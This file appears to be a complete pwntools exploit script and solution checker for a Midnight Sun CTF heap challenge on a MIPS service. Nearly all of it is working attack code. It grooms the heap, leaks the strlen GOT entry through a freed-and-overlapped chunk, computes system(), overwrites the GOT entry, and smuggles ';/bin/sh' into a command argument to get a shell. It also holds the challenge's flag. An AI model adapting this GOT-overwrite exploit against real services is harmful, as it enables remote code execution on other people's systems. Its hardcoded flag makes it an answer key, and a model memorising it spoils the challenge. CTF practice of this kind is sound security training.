#!/usr/bin/env python
from pwn import *
import sys

HOST  = '127.0.0.1'
PORT  = 10111
FLAG  = 'midnight{goooOOO000000oOOOOOOooo444444AAAaaaLL}'
DEBUG = False
SH    = '/bin/sh'

# Static values (for speed)
GOT = 0x0041e078
SYS = 0x00045b9c

host = HOST
if len(sys.argv) > 1:
	host = sys.argv[1]

port = PORT
if len(sys.argv) > 2:
	port = sys.argv[2]

if len(sys.argv) > 3:
	DEBUG = True

def init():

	context.clear()
	context.update({'arch': 'mips', 'bits': 32, 'endian': 'little', 'os': 'linux'})

def add(alias, team, desc):

	io.sendline('add '+alias)

	io.recvuntil(': ')
	io.sendline(team)

	io.recvuntil(': ')
	io.sendline(desc)

	result = io.recvline('')

	io.recvuntil('> ')

	return result

def edit(alias, team, desc, score):

	io.sendline('edit '+alias)

	io.recvuntil(': ')
	io.sendline(team)

	io.recvuntil(': ')
	io.sendline(desc)

	io.recvuntil(': ')
	io.sendline(str(score))

	result = io.recvline('')

	io.recvuntil('> ', timeout=0.5)

	return result

def free(alias):

	io.sendline('delete '+alias)

	result = io.recvline('')

	io.recvuntil('> ')

	return result

# Connect
io = remote(host, port)

# Initlialise
init()

if DEBUG:
	log.info("GOT: 0x%08x" % GOT)
	log.info("SYS: 0x%08x" % SYS)

# Initial menu
io.recvuntil('> ')

# Setup the heap so the chunk we free is not bordering the top or bottom chunk
add('aa', 'A'*46, '0'*31)
add('bb', 'B'*46, '1'*31)
add('cc', 'C'*46, '2'*31)
add('dd', 'D'*46, '3'*31)

# Free the 3rd struct and string
free('cc')

# Edit the 2nd string so it goes where the 3rd struct chunk was
edit('bb', 'B'*46, 'x'*56+p32(GOT)[:3], 234)

# Leak GOT
io.sendline('display cc')
io.recvuntil('Desc: ')

leaks  = io.recvline().strip()
strlen = u32(leaks[:4])
system = strlen - SYS

if DEBUG == True:
	log.info("strlen(): 0x%08x" % strlen)
	log.info('system(): 0x%08x' % system)

# Overwrite strlen() pointer in GOT with system()
# We also put /bin/sh here because it will be in memory when we execute system()
edit('cc ;'+SH, 'C'*46, p32(system)+p32(0), 123)

# Clear junk in buffer
io.recvline()

if DEBUG == True:

	log.success('got shell?')
	io.sendline('id')
	io.info(io.recvline().strip())

	io.interactive()
	sys.exit(0)

else:

	io.sendline('cat flag')
	if io.recvline().strip() != FLAG:
		log.failure('fail')
		sys.exit(-1)
	else:
		log.success('pass')
		sys.exit(0)
